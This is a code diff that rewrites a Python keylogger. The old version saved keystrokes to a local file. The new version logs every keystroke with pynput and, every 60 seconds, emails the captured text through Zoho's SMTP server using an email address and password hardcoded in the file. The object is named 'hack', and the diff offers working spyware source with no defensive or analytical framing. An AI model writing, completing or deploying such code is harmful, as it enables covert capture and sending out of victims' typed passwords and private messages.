@@ -1,43 +1,55 @@
-import pynput #import pynput
+import smtplib
+import pynput.keyboard
+import threading
+from email.mime.text import MIMEText
+class Keylogger:
+    def __init__(self, time_intrevel, email, pssd):
+        self.log = " KeyLogger Started !!!!"
+        self.intrevel = time_intrevel
+        self.email = email
+        self.pssd = pssd
+    def append_log(self, string):
+        self.log = self.log + string
 
-from pynput.keyboard import Key,Listener #getting keyboard input
+    def keypress(self, key):
+        try:
+            ck= str(key.char)
+        except AttributeError:
+            if key == key.space:
+                ck = " "
+            else:
+                ck = " " + str(key) + " "
+        self.append_log(ck)
 
-count = 0
-keys = []
+    def report(self):
 
-def on_press(key):
-    global keys, count
-    
-    keys.append(key)
+        print(self.log)
+        self.mail(self.email, self.pssd, "\n\n"+self.log)
+        self.log = " "
+        timer = threading.Timer(self.intrevel, self.report)
+        timer.start()
+        print(self.log)
+
+    def mail(self, email, pssd, mssg):
+        server = smtplib.SMTP_SSL('smtp.zoho.com', 465)
+        msg = MIMEText(mssg)
+        msg['Subject'] = "Sent from python"
+        msg['From'] = email
+        msg['To'] = email
         
-    count += 1
-    print("{0} Key Pressed ".format(key))
+        #server.ehlo()
+        #server.starttls()
+        
+        server.login(email, pssd)
+        server.sendmail(email, email, msg.as_string())
 
-    if count >= 10:
-        count = 0
-        write_file(keys)
-        keys = []
+        server.quit()
 
+    def start(self):
+        listner = pynput.keyboard.Listener(on_press = self.keypress)
+        with listner:
+            self.report()
+            listner.join()
 
-def write_file(keys):
-    with open("d:\log2.txt", "a") as f:
-        for key in keys:
-            k = str(key).replace("'","")
-            
-            if k.find("space") > 0:
-                f.write(' ')
-            elif k.find("enter") > 0:
-                f.write('\n')
-            elif k.find("Key") == -1:
-                f.write(k)
-
-
-def on_release(key):
-    if key == Key.esc:
-        return True
-
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-    
-
+hack = Keylogger(60, "te001st@zohomail.com", "QWerty@1234")
+hack.start()
